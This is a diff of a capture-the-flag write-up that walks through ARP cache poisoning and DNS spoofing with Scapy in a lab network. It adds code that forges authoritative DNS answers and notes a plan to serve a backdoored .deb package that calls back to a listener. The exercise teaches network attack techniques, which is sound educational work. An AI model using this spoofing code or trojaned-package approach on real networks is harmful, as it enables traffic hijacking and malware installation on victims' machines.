@@ -431,8 +431,7 @@ guest@d6fc16938bc6:~/pcaps$ tshark -nnr dns.pcap
 
 https://medium.com/datadriveninvestor/arp-cache-poisoning-using-scapy-d6711ecbe112 
 
-- Step 10: Populate response values from 'packet' 
-	- Make a few small changes in order to redirect.
+- Step 10: Create ARP response: 
 
 ~~~
         
@@ -455,40 +454,26 @@ https://medium.com/datadriveninvestor/arp-cache-poisoning-using-scapy-d6711ecbe1
         sendp(response, iface="eth0")
 ~~~
 
-- Step 11: Notice that the infected host is attempting to resolve a DNS query.
-	- **ftp.osuosl.org**
-- Step 12: Get summary of DNS request. Output of 'packet.summary'
+- Step 11: Create DNS response:
+
+This works!
 ~~~
-<bound method Packet.summary of <Ether  dst=02:42:0a:06:00:03 │Serving HTTP on 0.0.0.0 port 80 (http:
-src=4c:24:57:ab:ed:84 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 │//0.0.0.0:80/) ...
-len=60 id=1 flags= frag=0 ttl=64 proto=udp chksum=0x5a4d src=1│
-0.6.6.35 dst=10.6.6.53 |<UDP  sport=4697 dport=domain len=40 c│
-hksum=0x2805 |<DNS  id=0 qr=0 opcode=QUERY aa=0 tc=0 rd=1 ra=0│
- z=0 ad=0 cd=0 rcode=ok qdcount=1 ancount=0 nscount=0 arcount=│
-0 qd=<DNSQR  qname='ftp.osuosl.org.' qtype=A qclass=IN |> an=N│
-one ns=None ar=None |>>>>>
-~~~
-
-
-- Step 16: Next challenge is to figure out how to grab the ephemeral port and respond to it. Along with any other fields we need for DNS response.
-
-~~~
-ipaddr_we_arp_spoofed = "10.6.6.53"
-
-def handle_dns_request(packet):
-    # Need to change mac addresses, Ip Addresses, and ports below.
-    
-
-    # We also need
-    eth = Ether(src=packet.dst, dst=packet.src)       # switch src and dst mac addr
-    ip  = IP(dst=packet[IP].src, src=packet[IP].dst)  # switch src and dst ip addr
-    udp = UDP(dport=packet[UDP].sport, sport=53)      # switch src and dst ports
-    dns = DNS(
-        # MISSING DNS RESPONSE LAYER VALUES 
+    eth = Ether(src=packet.dst, dst=packet.src)      # need to replace mac addresses
+    ip  = IP(dst=packet[IP].src, src=packet[IP].dst) # need to replace IP addresses
+    udp = UDP(dport=packet[UDP].sport, sport=53)     # need to replace ports
+    dns = DNS(  
+       id=packet[DNS].id,
+       qd=packet[DNS].qd,
+       qr=1,
+       aa=1,
+       an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=ipaddr)
     )
-    dns_response = eth / ip / udp / dns
-    sendp(dns_response, iface="eth0")
 ~~~
+
+- Step 12: Note file being requested with http request.
+	- "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"
+
+- Step 13: Create that file and make it call back to listener on local machine.
 
 
 
